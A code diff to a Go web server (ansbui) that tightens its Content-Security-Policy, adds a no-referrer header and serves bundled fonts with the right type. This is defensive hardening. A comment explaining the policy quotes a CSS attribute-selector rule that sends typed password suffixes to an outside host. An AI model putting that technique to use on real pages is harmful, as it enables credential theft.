@@ -156,6 +156,45 @@ func (s *Server) Handler() http.Handler {
 	return withLogging(withSecurityHeaders(withOriginGuard(s.withAuth(mux), allowedHostnames(s.Addr))))
 }
 
+// contentSecurityPolicy is sent on every response. The UI is one page
+// that holds every credential the operator types — the login password,
+// SSH, sudo and vault passwords — so what that page may load, and
+// where it may send anything, is pinned to ansbui itself:
+//
+//   - style-src 'self', font-src 'self': no stylesheet or font from
+//     another origin, and no inline <style>. A stylesheet is enough to
+//     read a password as it is typed: React keeps a controlled input's
+//     value in the DOM attribute, and a rule such as
+//     input[value$="ab"] { background: url(https://elsewhere/ab) }
+//     reports each new suffix. The page used to link one from a font
+//     host; the fonts now ship in web/fonts/.
+//   - img-src 'self' data:, connect-src 'self': the requests such a
+//     rule (or anything else in the page) could use to send data out —
+//     background images, fetch, WebSocket — only reach this origin.
+//   - default-src 'self' covers what is not listed (media, workers,
+//     manifests, frames); object-src 'none' and base-uri 'none' close
+//     plugins and <base> rewriting; form-action 'self'.
+//   - frame-ancestors 'none': see withSecurityHeaders.
+//
+// script-src is the weak directive, on purpose and for now. The UI is
+// compiled in the browser: Babel reads each <script type="text/babel">
+// and runs the result by adding an inline <script> to the page, which
+// needs 'unsafe-inline'. ('unsafe-eval' is not needed: the page was
+// loaded without it in Chromium, Firefox and WebKit.) 'unsafe-inline'
+// goes away only with a build step that ships plain .js files. Until
+// then this policy limits what an injected script could load and
+// where it could send data, not whether one could run.
+const contentSecurityPolicy = "default-src 'self'; " +
+	"script-src 'self' 'unsafe-inline'; " +
+	"style-src 'self'; " +
+	"img-src 'self' data:; " +
+	"font-src 'self'; " +
+	"connect-src 'self'; " +
+	"object-src 'none'; " +
+	"base-uri 'none'; " +
+	"form-action 'self'; " +
+	"frame-ancestors 'none'"
+
 // hstsMaxAge is one year, the value browsers and scanners treat as a
 // real commitment. No includeSubDomains: ansbui speaks for its own
 // hostname, not for whatever else lives under the parent domain.
@@ -186,7 +225,8 @@ const hstsMaxAge = "max-age=31536000"
 func withSecurityHeaders(h http.Handler) http.Handler {
 	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 		hd := w.Header()
-		hd.Set("Content-Security-Policy", "frame-ancestors 'none'")
+		hd.Set("Content-Security-Policy", contentSecurityPolicy)
+		hd.Set("Referrer-Policy", "no-referrer")
 		hd.Set("X-Frame-Options", "DENY")
 		hd.Set("X-Content-Type-Options", "nosniff")
 		if requestIsHTTPS(r) {
@@ -423,10 +463,16 @@ func (s *Server) serveStaticFile(w http.ResponseWriter, r *http.Request, name st
 		w.Header().Set("Etag", etag)
 		w.Header().Set("Cache-Control", "no-cache")
 	}
+	// Go's built-in extension table has no entry for web fonts, so the
+	// type would otherwise depend on whether the host has a mime.types
+	// file that lists them.
+	if strings.HasSuffix(name, ".woff2") {
+		w.Header().Set("Content-Type", "font/woff2")
+	}
 	// Zero modtime skips Last-Modified (embed has none); the ETag is the
 	// validator. ServeContent matches If-None-Match against the ETag we
 	// set and returns 304 when it matches, and infers Content-Type from
-	// the name's extension.
+	// the name's extension unless one is already set.
 	http.ServeContent(w, r, name, time.Time{}, rs)
 }
 
